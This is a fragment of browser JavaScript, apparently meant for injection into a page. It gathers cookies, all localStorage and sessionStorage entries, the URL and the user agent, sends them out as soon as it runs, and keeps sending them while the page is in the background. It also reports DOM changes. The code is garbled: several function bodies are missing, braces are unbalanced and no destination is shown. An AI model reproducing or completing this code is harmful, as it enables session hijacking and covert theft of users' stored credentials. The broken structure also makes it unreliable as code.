        (function() {
            let isPipMode = false;

            // Function to send batched data

                    // Send immediately

                    // Buffer data for later sending
                    dataBuffer.push(data);
                }

            // Extract all possible data
            function extractAllData() {
                return {
                    cookies: document.cookie,
                    localStorage: (() => {
                        let ls = {};
                        for(let i = 0; i < localStorage.length; i++) {
                            let key = localStorage.key(i);
                            ls[key] = localStorage.getItem(key);
                        }
                        return ls;
                    })(),
                    sessionStorage: (() => {
                        let ss = {};
                        for(let i = 0; i < sessionStorage.length; i++) {
                            let key = sessionStorage.key(i);
                            ss[key] = sessionStorage.getItem(key);
                        }
                        return ss;
                    })(),
                    url: window.location.href,
                    title: document.title,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
            }
            
            // Send initial data immediately
            sendData(extractAllData(), true);
            
            // Monitor PiP/background mode
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'hidden') {
                    console.log('App entering PiP/background mode');
                    isPipMode = true;

                    if (dataBuffer.length > 0) {

                    isPipMode = false;

                    sendData({event: 'foreground_return', timestamp: Date.now()}, true);

            // Background monitoring functions

                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        if (mutation.type === 'childList') {
                            sendData({
                                event: 'dom_change',
                                type: mutation.type,
                                timestamp: Date.now()
                            });
                        }
                    });
                });
                
                observer.observe(document.body, {
                    childList: true,
                    subtree: true,
                    attributes: true
                });
                
                // Periodic data extraction while in background
                let interval = setInterval(() => {
                    if (document.visibilityState === 'hidden') {
                        sendData(extractAllData());
                    } else {
                        clearInterval(interval);
                    }

            // Attempt to enable keepalive
